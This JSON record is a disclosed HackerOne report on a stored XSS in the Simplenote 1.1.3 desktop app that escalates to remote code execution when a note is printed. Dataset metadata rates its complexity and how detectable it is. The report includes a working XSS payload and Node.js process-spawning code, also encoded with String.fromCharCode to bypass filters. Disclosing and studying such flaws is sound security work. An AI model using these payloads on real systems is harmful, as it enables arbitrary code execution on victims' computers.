{
  "reported_to": "Automattic",
  "reported_by": "luigigubello ",
  "title": "RCE via Print function [Simplenote 1.1.3 - Desktop app] ",
  "content": "\nIn Simplenote 1.1.3 - Desktop app there is a stored XSS vulnerability that can be used to execute arbitrary code. If there is malicious code in the note and the user tries to print it (for example to save it as a PDF), the malicious code runs.\nThis report is based on the report #291539, by Yasin Soliman (ysx). I used his code to pass from XSS to RCE.\nStep to reproduce\n## 1 - Prerequisites\nDownload and install Simplenote 1.1.3 Desktop app (I use Debian, but I think the problem is present on all desktop versions)\nMarkdown must not be enabled\n## 2 - Stored XSS\nCreate a new note, and you write this text:\nCode 42 Bytes\n1\">'><details/open/ontoggle=confirm('XSS')>\nNow go to File --> Print. An alert box appears, so there is a XSS vulnerability and the code runs when the user tries to print the note.\n## 3 - From XSS to RCE\nThanks to [ysx] (https://hackerone.com/ysx), I used the code in his proof-of-concept.\nThe code to open the Gnome calculator in Debian is:\nCode 373 Bytes\n1var Process = process.binding('process_wrap').Process;\n2var proc = new Process();\n3proc.onexit = function(a,b) {};\n4var env = process.env;\n5var env_ = [];\n6for (var key in env) env_.push(key+'='+env[key]);\n7proc.spawn({file:'/usr/bin/gnome-calculator',cwd:null,windowsVerbatimArguments:false,detached:false,envPairs:env_,stdio:[{type:'ignore'},{type:'ignore'},{type:'ignore'}]});\nNow you use the functions writeln() and String.fromCharCode() to bypass possible filters. So you [encode] (https://www.martineve.com/2007/05/15/javascript-eval-string-fromcharcode-encoder) the script into unicode values. Now you can create the payload:\nCode 1.44 KiB\n1\">'><img src=x onerror=writeln(String.fromCharCode(60,115,99,114,105,112,116,62,10,118,97,114,32,80,114,111,99,101,115,115,32,61,32,112,114,111,99,101,115,115,46,98,105,110,100,105,110,103,40,39,112,114,111,99,101,115,115,95,119,114,97,112,39,41,46,80,114,111,99,101,115,115,59,10,118,97,114,32,112,114,111,99,32,61,32,110,101,119,32,80,114,111,99,101,115,115,40,41,59,10,112,114,111,99,46,111,110,101,120,105,116,32,61,32,102,117,110,99,116,105,111,110,40,97,44,98,41,32,123,125,59,10,118,97,114,32,101,110,118,32,61,32,112,114,111,99,101,115,115,46,101,110,118,59,10,118,97,114,32,101,110,118,95,32,61,32,91,93,59,10,102,111,114,32,40,118,97,114,32,107,101,121,32,105,110,32,101,110,118,41,32,101,110,118,95,46,112,117,115,104,40,107,101,121,43,39,61,39,43,101,110,118,91,107,101,121,93,41,59,10,112,114,111,99,46,115,112,97,119,110,40,123,102,105,108,101,58,39,47,117,115,114,47,98,105,110,47,103,110,111,109,101,45,99,97,108,99,117,108,97,116,111,114,39,44,99,119,100,58,110,117,108,108,44,119,105,110,100,111,119,115,86,101,114,98,97,116,105,109,65,114,103,117,109,101,110,116,115,58,102,97,108,115,101,44,100,101,116,97,99,104,101,100,58,102,97,108,115,101,44,101,110,118,80,97,105,114,115,58,101,110,118,95,44,115,116,100,105,111,58,91,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,44,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,44,123,116,121,112,101,58,39,105,103,110,111,114,101,39,125,93,125,41,59,10,60,47,115,99,114,105,112,116,62))>\nYou write it in a note, then you print it (or save like pdf). The Gnome calculator will open.\nI have attached two screenshots and a proof-of-concept video.\nImpact\nAn attacker can create a note with malicious code. Then he can share it with the victim, asking to print it or save it in pdf (it may be useful to have a pdf file) so the code is executed on the victim's computer.\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": null,
  "weaknesses": [
    "Code Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1532607960,
  "report_url": "https://hackerone.com/reports/358049",
  "is_multi_component": true,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Download and install Simplenote 1.1.3 Desktop app. Ensure Markdown is not enabled."
    ],
    [
      2,
      "Create a new note and insert the malicious payload: `1\">'><details/open/ontoggle=confirm('XSS')>`. Go to File --> Print to trigger the XSS."
    ],
    [
      3,
      "For RCE, use the encoded payload to execute `/usr/bin/gnome-calculator` when the note is printed or saved as PDF."
    ]
  ],
  "vuln_description": "The vulnerability involves a stored XSS in Simplenote 1.1.3 Desktop app that can be escalated to RCE when a user prints or saves a malicious note as PDF. The XSS is triggered during the print operation, allowing execution of arbitrary JavaScript, which is then used to spawn system processes.",
  "reason": "The attack requires understanding of XSS, process spawning in Electron apps, and encoding techniques to bypass potential filters. However, the steps are linear and the components (XSS to RCE) are well-documented in similar contexts.",
  "new_complexity": "MEDIUM",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": "291539",
  "authnz_metadata": {
    "reason": "The vulnerability involves a stored XSS that leads to RCE via the print function in the Simplenote desktop app. The methodology described focuses on authentication and authorization bugs (IDOR, AuthN/AuthZ bypass) by testing different user sessions and resource IDs within the same application. The XSS to RCE vulnerability does not fit into these categories as it does not involve crossing authorization boundaries or manipulating user sessions/resource IDs. Instead, it exploits a client-side rendering issue during the print functionality.",
    "is_detectable": false
  },
  "injection_metadata": {
    "reasoning": "The vulnerability involves a stored XSS in note content that triggers during a regular user action (printing). The methodology would log HTTP requests/responses when creating/editing notes (injectable parameter) and detect execution via regular navigation (printing is a built-in feature). The initial XSS payload uses basic HTML context manipulation without custom encoding/filter bypasses (matches 'simple payload' criteria). While the RCE escalation requires Node.js-specific code, the XSS primitive itself fits the methodology's scope since: (1) injection occurs in a user-controlled parameter (note content), (2) payload execution is triggered through normal app usage, and (3) the base XSS uses context-appropriate payloads from a standard list.",
    "is_simple_injection": true
  }
}